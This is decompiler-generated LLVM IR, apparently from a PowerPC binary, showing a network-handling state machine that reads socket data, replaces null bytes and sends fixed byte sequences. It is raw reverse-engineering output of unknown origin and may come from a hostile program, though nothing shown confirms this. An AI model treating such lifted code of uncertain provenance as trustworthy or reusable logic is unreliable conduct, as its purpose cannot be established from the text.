  %v2_1000943c = inttoptr i32 %v1_1000943c to i32*
  %v3_1000943c = load i32, i32* %v2_1000943c, align 4
  store i32 %v3_1000943c, i32* %r3.global-to-local, align 4
  %v1_10009440 = icmp slt i32 %v3_1000943c, -1
  %v3_10009440 = icmp eq i32 %v3_1000943c, -1
  store i1 %v1_10009440, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10009440, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10009440, label %dec_label_pc_10009410, label %dec_label_pc_10009448

dec_label_pc_10009448:                            ; preds = %dec_label_pc_10009424
  store i32 %v2_10009648, i32* %r11.global-to-local, align 4
  %v1_1000944c = call i32 @__asm_rlwinm(i32 %v3_1000943c, i32 29, i32 3, i32 29)
  %v1_10009450 = load i32, i32* %r11.global-to-local, align 4
  %v2_10009450 = add i32 %v1_10009450, %v1_1000944c
  store i32 %v2_10009450, i32* %r9.global-to-local, align 4
  %v0_10009454 = load i32, i32* %r3.global-to-local, align 4
  %v1_10009454 = urem i32 %v0_10009454, 32
  store i32 %v1_10009454, i32* %r11.global-to-local, align 4
  %v1_10009458 = add i32 %v2_10009450, 184
  %v2_10009458 = inttoptr i32 %v1_10009458 to i32*
  %v3_10009458 = load i32, i32* %v2_10009458, align 4
  %v3_1000945c = lshr i32 %v3_10009458, %v1_10009454
  store i32 %v3_1000945c, i32* %r0.global-to-local, align 4
  %v1_10009460 = urem i32 %v3_1000945c, 2
  store i32 %v1_10009460, i32* %r9.global-to-local, align 4
  %v3_10009460 = icmp eq i32 %v1_10009460, 0
  br i1 %v3_10009460, label %dec_label_pc_10009468, label %dec_label_pc_1000a020

dec_label_pc_10009468:                            ; preds = %dec_label_pc_10009448, %dec_label_pc_1000a0b8
  %v0_1000946c = phi i32 [ %v0_10009454, %dec_label_pc_10009448 ], [ %v0_1000946c.pre, %dec_label_pc_1000a0b8 ]
  store i32 %v2_10009648, i32* %r0.global-to-local, align 4
  %v1_1000946c = call i32 @__asm_rlwinm(i32 %v0_1000946c, i32 29, i32 3, i32 29)
  %v1_10009470 = load i32, i32* %r0.global-to-local, align 4
  %v2_10009470 = add i32 %v1_10009470, %v1_1000946c
  store i32 %v2_10009470, i32* %r9.global-to-local, align 4
  %v0_10009474 = load i32, i32* %r3.global-to-local, align 4
  %v1_10009474 = urem i32 %v0_10009474, 32
  store i32 %v1_10009474, i32* %r11.global-to-local, align 4
  %v1_10009478 = add i32 %v2_10009470, 56
  %v2_10009478 = inttoptr i32 %v1_10009478 to i32*
  %v3_10009478 = load i32, i32* %v2_10009478, align 4
  %v3_1000947c = lshr i32 %v3_10009478, %v1_10009474
  store i32 %v3_1000947c, i32* %r0.global-to-local, align 4
  %v1_10009480 = urem i32 %v3_1000947c, 2
  store i32 %v1_10009480, i32* %r9.global-to-local, align 4
  %v3_10009480 = icmp eq i32 %v1_10009480, 0
  br i1 %v3_10009480, label %dec_label_pc_10009410, label %dec_label_pc_10009488.preheader

dec_label_pc_10009488.preheader:                  ; preds = %dec_label_pc_10009468
  %v0_10009488.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_10009488

dec_label_pc_10009488:                            ; preds = %dec_label_pc_10009488.preheader, %dec_label_pc_100094f4
  %v0_10009f70 = phi i32 [ %v0_10009488.pre, %dec_label_pc_10009488.preheader ], [ %v0_10009508, %dec_label_pc_100094f4 ]
  %v1_10009488 = add i32 %v0_10009f70, 12
  %v2_10009488 = inttoptr i32 %v1_10009488 to i32*
  %v3_10009488 = load i32, i32* %v2_10009488, align 4
  store i32 %v3_10009488, i32* %r10.global-to-local, align 4
  %v1_1000948c = icmp slt i32 %v3_10009488, 0
  %v3_1000948c = icmp eq i32 %v3_10009488, 0
  store i1 %v1_1000948c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000948c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000948c, label %dec_label_pc_10009410, label %dec_label_pc_10009494

dec_label_pc_10009494:                            ; preds = %dec_label_pc_10009488
  %v1_10009494 = add i32 %v0_10009f70, 24
  %v2_10009494 = inttoptr i32 %v1_10009494 to i32*
  %v3_10009494 = load i32, i32* %v2_10009494, align 4
  store i32 %v3_10009494, i32* %r0.global-to-local, align 4
  %v1_10009498 = add i32 %v0_10009f70, 28
  store i32 %v1_10009498, i32* %r24.global-to-local, align 4
  %v1_1000949c = icmp slt i32 %v3_10009494, 256
  %v3_1000949c = icmp eq i32 %v3_10009494, 256
  store i1 %v1_1000949c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000949c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000949c, label %dec_label_pc_10009f70, label %dec_label_pc_100094a4

dec_label_pc_100094a4:                            ; preds = %dec_label_pc_10009494, %dec_label_pc_10009f70
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r6.global-to-local, align 4
  %v1_100094ac = load i32, i32* %r22.global-to-local, align 4
  %v2_100094ac = inttoptr i32 %v1_100094ac to i32*
  store i32 0, i32* %v2_100094ac, align 4
  %v0_100094b0 = load i32, i32* @r28, align 4
  %v1_100094b0 = add i32 %v0_100094b0, 24
  %v2_100094b0 = inttoptr i32 %v1_100094b0 to i32*
  %v3_100094b0 = load i32, i32* %v2_100094b0, align 4
  %v1_100094b4 = add i32 %v0_100094b0, 4
  %v2_100094b4 = inttoptr i32 %v1_100094b4 to i32*
  %v3_100094b4 = load i32, i32* %v2_100094b4, align 4
  store i32 %v3_100094b4, i32* %r3.global-to-local, align 4
  %v0_100094b8 = load i32, i32* %r24.global-to-local, align 4
  %v2_100094b8 = add i32 %v0_100094b8, %v3_100094b0
  store i32 %v2_100094b8, i32* @r29, align 4
  %v1_100094bc = sub i32 256, %v3_100094b0
  store i32 %v2_100094b8, i32* %r4.global-to-local, align 4
  store i32 268473544, i32* @lr, align 4
  %v4_100094c4 = call i32 @function_1000c090(i32 %v3_100094b4, i32 %v2_100094b8, i32 %v1_100094bc, i32 16384)
  store i32 %v4_100094c4, i32* %r3.global-to-local, align 4
  %tmp120 = icmp slt i32 %v4_100094c4, 1
  br i1 %tmp120, label %dec_label_pc_10009f0c, label %dec_label_pc_100094d0

dec_label_pc_100094d0:                            ; preds = %dec_label_pc_100094a4
  store i32 %v4_100094c4, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  store i32 65, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_100094dc

dec_label_pc_100094dc:                            ; preds = %dec_label_pc_100094ec, %dec_label_pc_100094d0
  %v0_100094f047 = phi i32 [ %v1_100094f0, %dec_label_pc_100094ec ], [ %v4_100094c4, %dec_label_pc_100094d0 ]
  %v1_100094e8 = phi i32 [ %v1_100094ec, %dec_label_pc_100094ec ], [ 0, %dec_label_pc_100094d0 ]
  %v1_100094dc = load i32, i32* @r29, align 4
  %v2_100094dc = add i32 %v1_100094dc, %v1_100094e8
  %v3_100094dc = inttoptr i32 %v2_100094dc to i8*
  %v4_100094dc = load i8, i8* %v3_100094dc, align 1
  %v5_100094dc = zext i8 %v4_100094dc to i32
  store i32 %v5_100094dc, i32* %r0.global-to-local, align 4
  %v3_100094e0 = icmp eq i8 %v4_100094dc, 0
  store i1 false, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100094e0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100094e0, label %dec_label_pc_100094e8, label %dec_label_pc_100094ec

dec_label_pc_100094e8:                            ; preds = %dec_label_pc_100094dc
  %v0_100094e8 = load i32, i32* %r11.global-to-local, align 4
  %v3_100094e8 = trunc i32 %v0_100094e8 to i8
  store i8 %v3_100094e8, i8* %v3_100094dc, align 1
  %v0_100094ec.pre = load i32, i32* %r9.global-to-local, align 4
  %v0_100094f0.pre = load i32, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_100094ec

dec_label_pc_100094ec:                            ; preds = %dec_label_pc_100094dc, %dec_label_pc_100094e8
  %v0_100094f0 = phi i32 [ %v0_100094f047, %dec_label_pc_100094dc ], [ %v0_100094f0.pre, %dec_label_pc_100094e8 ]
  %v0_100094ec = phi i32 [ %v1_100094e8, %dec_label_pc_100094dc ], [ %v0_100094ec.pre, %dec_label_pc_100094e8 ]
  %v1_100094ec = add i32 %v0_100094ec, 1
  store i32 %v1_100094ec, i32* %r9.global-to-local, align 4
  %v1_100094f0 = add i32 %v0_100094f0, -1
  store i32 %v1_100094f0, i32* %ctr.global-to-local, align 4
  %v2_100094f0 = icmp eq i32 %v1_100094f0, 0
  br i1 %v2_100094f0, label %dec_label_pc_100094f4, label %dec_label_pc_100094dc

dec_label_pc_100094f4:                            ; preds = %dec_label_pc_100094ec, %dec_label_pc_10009f10
  %v0_100094f4 = load i32, i32* @r28, align 4
  %v1_100094f4 = add i32 %v0_100094f4, 24
  %v2_100094f4 = inttoptr i32 %v1_100094f4 to i32*
  %v3_100094f4 = load i32, i32* %v2_100094f4, align 4
  %v3_100094f8 = load i32, i32* @global_var_1001eb38.185, align 4
  store i32 %v3_100094f8, i32* %r0.global-to-local, align 4
  %v2_100094fc = add i32 %v3_100094f4, %v4_100094c4
  store i32 %v2_100094fc, i32* %r4.global-to-local, align 4
  store i32 %v2_100094fc, i32* %v2_100094f4, align 4
  %v0_10009504 = load i32, i32* %r0.global-to-local, align 4
  %v1_10009504 = load i32, i32* @r28, align 4
  %v2_10009504 = add i32 %v1_10009504, 8
  %v3_10009504 = inttoptr i32 %v2_10009504 to i32*
  store i32 %v0_10009504, i32* %v3_10009504, align 4
  %v0_10009508 = load i32, i32* @r28, align 4
  %v1_10009508 = add i32 %v0_10009508, 12
  %v2_10009508 = inttoptr i32 %v1_10009508 to i32*
  %v3_10009508 = load i32, i32* %v2_10009508, align 4
  store i32 %v3_10009508, i32* %r10.global-to-local, align 4
  %v1_1000950c = icmp ult i32 %v3_10009508, 10
  %v2_1000950c = icmp ugt i32 %v3_10009508, 10
  %v3_1000950c = icmp eq i32 %v3_10009508, 10
  store i1 %v1_1000950c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000950c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1000950c, label %dec_label_pc_10009488, label %dec_label_pc_10009514

dec_label_pc_10009514:                            ; preds = %dec_label_pc_100094f4
  store i32 268500992, i32* %r9.global-to-local, align 4
  %v1_10009518 = mul i32 %v3_10009508, 4
  store i32 %v1_10009518, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000e0fc.251 to i32), i32* %r11.global-to-local, align 4
  %v2_10009520 = add i32 %v1_10009518, ptrtoint (i32* @global_var_1000e0fc.251 to i32)
  %v3_10009520 = inttoptr i32 %v2_10009520 to i32*
  %v4_10009520 = load i32, i32* %v3_10009520, align 4
  %v2_10009524 = add i32 %v4_10009520, ptrtoint (i32* @global_var_1000e0fc.251 to i32)
  store i32 %v2_10009524, i32* %r9.global-to-local, align 4
  store i32 %v2_10009524, i32* %ctr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v2_10009524)
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v2_1000a034, i32* %r4.global-to-local, align 4
  store i32 16384, i32* %r6.global-to-local, align 4
  %v0_10009540 = load i32, i32* @r26, align 4
  store i32 %v0_10009540, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-1896, align 4
  store i32 268473676, i32* @lr, align 4
  %v4_10009548 = call i32 @function_1000c108(i32 %v0_10009540, i32 %v2_1000a034, i32 1, i32 16384)
  store i32 16384, i32* %r6.global-to-local, align 4
  store i32 %v2_1000a030, i32* %r4.global-to-local, align 4
  %v0_10009558 = load i32, i32* @r26, align 4
  store i32 %v0_10009558, i32* %r3.global-to-local, align 4
  store i32 268473696, i32* @lr, align 4
  %v4_1000955c = call i32 @function_1000c108(i32 %v0_10009558, i32 %v2_1000a030, i32 4, i32 16384)
  store i32 %v2_10009648, i32* %r4.global-to-local, align 4
  store i32 16384, i32* %r6.global-to-local, align 4
  %v0_1000956c = load i32, i32* @r26, align 4
  store i32 %v0_1000956c, i32* %r3.global-to-local, align 4
  store i32 268473716, i32* @lr, align 4
  %v4_10009570 = call i32 @function_1000c108(i32 %v0_1000956c, i32 %v2_10009648, i32 2, i32 16384)
  store i32 ptrtoint (i8* @global_var_1000df44.212 to i32), i32* %r4.global-to-local, align 4
  store i32 16384, i32* %r6.global-to-local, align 4
  %v0_10009580 = load i32, i32* @r26, align 4
  store i32 %v0_10009580, i32* %r3.global-to-local, align 4
  store i32 268473736, i32* @lr, align 4
  %v5_10009584 = call i32 @function_1000c108(i32 %v0_10009580, i32 sext (i8 ptrtoint (i8* @global_var_1000df44.212 to i8) to i32), i32 1, i32 16384)
  store i32 1380143441, i32* %r4.global-to-local, align 4
  store i32 16384, i32* %r6.global-to-local, align 4
  %v0_10009594 = load i32, i32* @r26, align 4
  store i32 %v0_10009594, i32* %r3.global-to-local, align 4
  store i32 268473756, i32* @lr, align 4
  %v6_10009598 = call i32 @function_1000c108(i32 %v0_10009594, i32 1380143441, i32 19, i32 16384)
  store i32 ptrtoint (i8* @global_var_1000df45.259 to i32), i32* %r4.global-to-local, align 4
  store i32 16384, i32* %r6.global-to-local, align 4
  %v0_100095a8 = load i32, i32* @r26, align 4
  store i32 %v0_100095a8, i32* %r3.global-to-local, align 4
  store i32 268473776, i32* @lr, align 4
  %v5_100095ac = call i32 @function_1000c108(i32 %v0_100095a8, i32 sext (i8 ptrtoint (i8* @global_var_1000df45.259 to i8) to i32), i32 1, i32 16384)
  store i32 1431130182, i32* %r4.global-to-local, align 4
  %v0_100095b8 = load i32, i32* @r26, align 4
  store i32 %v0_100095b8, i32* %r3.global-to-local, align 4
  store i32 16384, i32* %r6.global-to-local, align 4
  store i32 268473796, i32* @lr, align 4
  %v6_100095c0 = call i32 @function_1000c108(i32 %v0_100095b8, i32 1431130182, i32 16, i32 16384)
  %v0_100095c4 = load i32, i32* @r26, align 4
  store i32 %v0_100095c4, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100095cc.261 to i32), i32* @lr, align 4
  %v0_100095c8 = call i32 @function_1000b3f0()
  store i32 %v0_100095c8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100095cc

dec_label_pc_100095cc:                            ; preds = %dec_label_pc_10008950, %dec_label_pc_1000a20c, %dec_label_pc_10009514
  %v0_100095d0 = call i32 @function_1000cc60()
  store i32 %v0_100095d0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100095d4

dec_label_pc_100095d4:                            ; preds = %dec_label_pc_10008fc0, %dec_label_pc_100095cc
  %v0_1000906422 = phi i32 [ %v0_100095d0, %dec_label_pc_100095cc ], [ %v1_10008f88, %dec_label_pc_10008fc0 ]
  %v0_100095d4 = load i32, i32* @r9, align 4
  %v1_100095d4 = icmp slt i32 %v0_100095d4, 168
  %v3_100095d4 = icmp eq i32 %v0_100095d4, 168
  store i1 %v1_100095d4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100095d4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100095d4, label %dec_label_pc_10008f74.preheader, label %dec_label_pc_100095d4.dec_label_pc_10009058_crit_edge

dec_label_pc_100095d4.dec_label_pc_10009058_crit_edge: ; preds = %dec_label_pc_100095d4
  %v0_10009058.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10009058

dec_label_pc_100095e0:                            ; preds = %dec_label_pc_10008fc8
  %v0_100095e0 = load i32, i32* @r9, align 4
  %v1_100095e0 = icmp ult i32 %v0_100095e0, 15
  %v3_100095e0 = icmp eq i32 %v0_100095e0, 15
  store i1 %v1_100095e0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100095e0, i1* %cr7_eq.global-to-local, align 1
  %tmp121 = icmp ult i32 %v0_100095e0, 16
  br i1 %tmp121, label %dec_label_pc_10009058, label %dec_label_pc_100095e8

dec_label_pc_100095e8:                            ; preds = %dec_label_pc_100095e0
  %v1_100095e8 = icmp ult i32 %v0_100095e0, 31
  %v3_100095e8 = icmp eq i32 %v0_100095e0, 31
  store i1 %v1_100095e8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100095e8, i1* %cr7_eq.global-to-local, align 1
  %tmp122 = icmp ult i32 %v0_100095e0, 32
  br i1 %tmp122, label %dec_label_pc_10008f74, label %dec_label_pc_10009058

dec_label_pc_100095f4:                            ; preds = %dec_label_pc_10008fd0
  %v0_100095f4 = load i32, i32* @r9, align 4
  %v1_100095f4 = icmp ult i32 %v0_100095f4, 63
  %v3_100095f4 = icmp eq i32 %v0_100095f4, 63
  store i1 %v1_100095f4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100095f4, i1* %cr7_eq.global-to-local, align 1
  %tmp123 = icmp ult i32 %v0_100095f4, 64
  br i1 %tmp123, label %dec_label_pc_10009058, label %dec_label_pc_100095fc

dec_label_pc_100095fc:                            ; preds = %dec_label_pc_100095f4
  %v1_100095fc = icmp ult i32 %v0_100095f4, 126
  %v3_100095fc = icmp eq i32 %v0_100095f4, 126
  store i1 %v1_100095fc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100095fc, i1* %cr7_eq.global-to-local, align 1
  %tmp124 = icmp ult i32 %v0_100095f4, 127
  br i1 %tmp124, label %dec_label_pc_10008f74, label %dec_label_pc_10009058

dec_label_pc_10009608:                            ; preds = %dec_label_pc_10008fd8
  %v0_10009608 = load i32, i32* @r9, align 4
  %v1_10009608 = icmp slt i32 %v0_10009608, 255
  %v3_10009608 = icmp eq i32 %v0_10009608, 255
  store i1 %v1_10009608, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10009608, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10009608, label %dec_label_pc_10008f74, label %dec_label_pc_10009058

dec_label_pc_10009614:                            ; preds = %dec_label_pc_10008fe0
  %v0_10009614 = load i32, i32* @r9, align 4
  %v1_10009614 = icmp ult i32 %v0_10009614, 17
  %v3_10009614 = icmp eq i32 %v0_10009614, 17
  store i1 %v1_10009614, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10009614, i1* %cr7_eq.global-to-local, align 1
  %tmp125 = icmp ult i32 %v0_10009614, 18
  br i1 %tmp125, label %dec_label_pc_10009058, label %dec_label_pc_1000961c

dec_label_pc_1000961c:                            ; preds = %dec_label_pc_10009614
  %v1_1000961c = icmp eq i32 %v0_10009614, 18
  %v3_1000961c = icmp eq i32 %v0_10009614, 19
  store i1 %v1_1000961c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000961c, i1* %cr7_eq.global-to-local, align 1
  %tmp126 = icmp ult i32 %v0_10009614, 20
  br i1 %tmp126, label %dec_label_pc_10008f74, label %dec_label_pc_10009058

dec_label_pc_10009634:                            ; preds = %dec_label_pc_10009334
  %v1_10009634 = icmp slt i32 %v3_10009350, 0
  store i1 %v1_10009634, i1* %cr7_lt.global-to-local, align 1
  store i1 %v1_10009354, i1* %cr7_eq.global-to-local, align 1
  br i1 %v1_10009354, label %dec_label_pc_10009320, label %dec_label_pc_1000963c

dec_label_pc_1000963c:                            ; preds = %dec_label_pc_10009634
  store i32 5, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000935c

dec_label_pc_10009644:                            ; preds = %dec_label_pc_100092e4
  store i32 %v2_10009648, i32* %r0.global-to-local, align 4
  %v1_1000964c = call i32 @__asm_rlwinm(i32 %v3_10009644, i32 29, i32 3, i32 29)
  %v0_10009650 = load i32, i32* %r28.global-to-local, align 4
  %v2_10009650 = icmp slt i32 %v0_10009650, %v3_10009644
  %v4_10009650 = icmp eq i32 %v0_10009650, %v3_10009644
  store i1 %v2_10009650, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10009650, i1* %cr7_eq.global-to-local, align 1
  %v1_10009654 = load i32, i32* %r0.global-to-local, align 4
  %v2_10009654 = add i32 %v1_10009654, %v1_1000964c
  store i32 %v2_10009654, i32* %r11.global-to-local, align 4
  %v1_10009658 = urem i32 %v3_10009644, 32
  store i32 %v1_10009658, i32* %r0.global-to-local, align 4
  %v1_1000965c = add i32 %v2_10009654, 184
  %v2_1000965c = inttoptr i32 %v1_1000965c to i32*
  %v3_1000965c = load i32, i32* %v2_1000965c, align 4
  %v0_10009660 = load i32, i32* %r10.global-to-local, align 4
  %v3_10009660 = shl i32 %v0_10009660, %v1_10009658
  store i32 %v3_10009660, i32* %r0.global-to-local, align 4
  %v2_10009664 = or i32 %v3_10009660, %v3_1000965c
  store i32 %v2_10009664, i32* %r9.global-to-local, align 4
  store i32 %v2_10009664, i32* %v2_1000965c, align 4
  br i1 %v2_10009650, label %dec_label_pc_10009670, label %dec_label_pc_10009320

dec_label_pc_10009670:                            ; preds = %dec_label_pc_10009644
  store i32 %v3_10009644, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_10009320

dec_label_pc_10009678:                            ; preds = %dec_label_pc_1000938c, %dec_label_pc_10009370
  %v0_10009678 = load i32, i32* %r25.global-to-local, align 4
  %v1_10009678 = load i32, i32* @r29, align 4
  %v2_10009678 = add i32 %v1_10009678, 12
  %v3_10009678 = inttoptr i32 %v2_10009678 to i32*
  store i32 %v0_10009678, i32* %v3_10009678, align 4
  %v0_1000967c = load i32, i32* @r26, align 4
  %v1_1000967c = trunc i32 %v0_1000967c to i8
  %v2_1000967c = load i32, i32* @r29, align 4
  %v3_1000967c = add i32 %v2_1000967c, 284
  %v4_1000967c = inttoptr i32 %v3_1000967c to i8*
  store i8 %v1_1000967c, i8* %v4_1000967c, align 1
  br label %dec_label_pc_10009320

dec_label_pc_10009f0c:                            ; preds = %dec_label_pc_100094a4
  %v3_100094c8 = icmp eq i32 %v4_100094c4, 0
  br i1 %v3_100094c8, label %dec_label_pc_1000a200, label %dec_label_pc_10009f10

dec_label_pc_10009f10:                            ; preds = %dec_label_pc_10009f0c
  %v1_10009f10 = icmp slt i32 %v4_100094c4, -1
  %v3_10009f10 = icmp eq i32 %v4_100094c4, -1
  store i1 %v1_10009f10, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10009f10, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10009f10, label %dec_label_pc_10009f18, label %dec_label_pc_100094f4

dec_label_pc_10009f18:                            ; preds = %dec_label_pc_10009f10
  %v0_10009f18 = load i32, i32* %r22.global-to-local, align 4
  %v1_10009f18 = inttoptr i32 %v0_10009f18 to i32*
  %v2_10009f18 = load i32, i32* %v1_10009f18, align 4
  store i32 %v2_10009f18, i32* %r0.global-to-local, align 4
  %v1_10009f1c = icmp slt i32 %v2_10009f18, 11
  %v3_10009f1c = icmp eq i32 %v2_10009f18, 11
  store i1 %v1_10009f1c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10009f1c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10009f1c, label %dec_label_pc_10009410, label %dec_label_pc_10009f24

dec_label_pc_10009f24:                            ; preds = %dec_label_pc_10009f18, %dec_label_pc_1000a200
  %v0_10009f24 = load i32, i32* @r28, align 4
  %v1_10009f24 = add i32 %v0_10009f24, 4
  %v2_10009f24 = inttoptr i32 %v1_10009f24 to i32*
  %v3_10009f24 = load i32, i32* %v2_10009f24, align 4
  store i32 %v3_10009f24, i32* %r3.global-to-local, align 4
  store i32 268476204, i32* @lr, align 4
  %v0_10009f28 = call i32 @function_1000b3f0()
  store i32 %v0_10009f28, i32* %r3.global-to-local, align 4
  %v0_10009f2c = load i32, i32* @r28, align 4
  %v1_10009f2c = add i32 %v0_10009f2c, 284
  %v2_10009f2c = inttoptr i32 %v1_10009f2c to i8*
  %v3_10009f2c = load i8, i8* %v2_10009f2c, align 1
  %v4_10009f2c = zext i8 %v3_10009f2c to i32
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_10009f34 = add nuw nsw i32 %v4_10009f2c, 1
  store i32 %v1_10009f34, i32* %r9.global-to-local, align 4
  %v2_10009f38 = add i32 %v0_10009f2c, 4
  %v3_10009f38 = inttoptr i32 %v2_10009f38 to i32*
  store i32 -1, i32* %v3_10009f38, align 4
  %v0_10009f3c = load i32, i32* %r9.global-to-local, align 4
  %v1_10009f3c = urem i32 %v0_10009f3c, 256
  store i32 %v1_10009f3c, i32* %r9.global-to-local, align 4
  %v1_10009f40 = icmp ult i32 %v1_10009f3c, 9
  %v3_10009f40 = icmp eq i32 %v1_10009f3c, 9
  store i1 %v1_10009f40, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10009f40, i1* %cr7_eq.global-to-local, align 1
  %v1_10009f44 = trunc i32 %v0_10009f3c to i8
  %v2_10009f44 = load i32, i32* @r28, align 4
  %v3_10009f44 = add i32 %v2_10009f44, 284
  %v4_10009f44 = inttoptr i32 %v3_10009f44 to i8*
  store i8 %v1_10009f44, i8* %v4_10009f44, align 1
  %v0_10009f48 = load i1, i1* %cr7_eq.global-to-local, align 1
  %v1_10009f48 = load i1, i1* %cr7_lt.global-to-local, align 1
  %v2_10009f48 = or i1 %v0_10009f48, %v1_10009f48
  br i1 %v2_10009f48, label %dec_label_pc_1000a21c, label %dec_label_pc_10009f4c

dec_label_pc_10009f4c:                            ; preds = %dec_label_pc_10009f24
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10009f54 = load i32, i32* @r28, align 4
  %v2_10009f54 = add i32 %v1_10009f54, 12
  %v3_10009f54 = inttoptr i32 %v2_10009f54 to i32*
  store i32 0, i32* %v3_10009f54, align 4
  %v0_10009f58 = load i32, i32* %r0.global-to-local, align 4
  %v1_10009f58 = trunc i32 %v0_10009f58 to i8
  %v2_10009f58 = load i32, i32* @r28, align 4
  %v3_10009f58 = add i32 %v2_10009f58, 284
  %v4_10009f58 = inttoptr i32 %v3_10009f58 to i8*
  store i8 %v1_10009f58, i8* %v4_10009f58, align 1
  br label %dec_label_pc_10009410

dec_label_pc_10009f70:                            ; preds = %dec_label_pc_10009494
  %v1_10009f70 = add i32 %v0_10009f70, 92
  store i32 %v1_10009f70, i32* %r4.global-to-local, align 4
  store i32 %v1_10009498, i32* %r3.global-to-local, align 4
  store i32 268476288, i32* @lr, align 4
  %v3_10009f7c = call i32 @function_1000bbec(i32 %v1_10009498, i32 %v1_10009f70, i32 192)
  store i32 %v3_10009f7c, i32* %r3.global-to-local, align 4
  %v0_10009f80 = load i32, i32* @r28, align 4
  %v1_10009f80 = add i32 %v0_10009f80, 24
  %v2_10009f80 = inttoptr i32 %v1_10009f80 to i32*
  %v3_10009f80 = load i32, i32* %v2_10009f80, align 4
  store i32 %v3_10009f80, i32* %r9.global-to-local, align 4
  %v1_10009f84 = add i32 %v3_10009f80, -64
  store i32 %v1_10009f84, i32* %r4.global-to-local, align 4
  store i32 %v1_10009f84, i32* %v2_10009f80, align 4
  br label %dec_label_pc_100094a4

dec_label_pc_1000a020:                            ; preds = %dec_label_pc_10009448
  store i32 4, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 1, i32* %r4.global-to-local, align 4
  store i32 %v2_1000a030, i32* %r6.global-to-local, align 4
  store i32 %v2_1000a034, i32* %r7.global-to-local, align 4
  store i32 4, i32* %stack_var_-1896, align 4
  store i32 0, i32* %stack_var_-1904, align 4
  store i32 268476484, i32* @lr, align 4
  %v5_1000a040 = call i32 @function_1000c024(i32 1, i32 4, i32 %v2_1000a030, i32 %v2_1000a034, i32 %v1_10009460)
  store i32 %v5_1000a040, i32* %r3.global-to-local, align 4
  %v3_1000a044 = load i32, i32* %stack_var_-1904, align 4
  store i32 %v3_1000a044, i32* %r0.global-to-local, align 4
  %v2_1000a048 = or i32 %v3_1000a044, %v5_1000a040
  store i32 %v2_1000a048, i32* %r9.global-to-local, align 4
  %v5_1000a048 = icmp eq i32 %v2_1000a048, 0
  br i1 %v5_1000a048, label %dec_label_pc_1000a050, label %dec_label_pc_1000a0e0

dec_label_pc_1000a050:                            ; preds = %dec_label_pc_1000a020
  store i32 2, i32* %r10.global-to-local, align 4
  %v1_1000a054 = load i32, i32* @r28, align 4
  %v2_1000a054 = add i32 %v1_1000a054, 12
  %v3_1000a054 = inttoptr i32 %v2_1000a054 to i32*
  store i32 2, i32* %v3_1000a054, align 4
  %v0_1000a058 = call i32 @function_10007ca8()
  %v3_1000a060 = load i16, i16* @global_var_1001eb34.188, align 2
  %v4_1000a060 = zext i16 %v3_1000a060 to i32
  store i32 %v4_1000a060, i32* %r11.global-to-local, align 4
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v3_1000a068 = load i32, i32* @global_var_1001eb2c.186, align 4
  store i32 %v3_1000a068, i32* %r10.global-to-local, align 4
  %v1_1000a070 = icmp slt i32 %v3_1000a068, 0
  %v3_1000a070 = icmp eq i32 %v3_1000a068, 0
  store i1 %v1_1000a070, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a070, i1* %cr7_eq.global-to-local, align 1
  %v2_1000a06c = urem i32 %v0_1000a058, %v4_1000a060
  %v2_1000a074 = sub i32 %v0_1000a058, %v2_1000a06c
  store i32 %v2_1000a074, i32* %r0.global-to-local, align 4
  store i32 %v2_1000a06c, i32* %r3.global-to-local, align 4
  %tmp128 = icmp slt i32 %v3_1000a068, 1
  br i1 %tmp128, label %dec_label_pc_1000a1d0, label %dec_label_pc_1000a084

dec_label_pc_1000a084:                            ; preds = %dec_label_pc_1000a050
  store i32 268566528, i32* %r9.global-to-local, align 4
  store i32 %v3_1000a068, i32* %ctr.global-to-local, align 4
  %v3_1000a08c = load i32, i32* @global_var_1001eb30.187, align 4
  store i32 %v3_1000a08c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000a09c

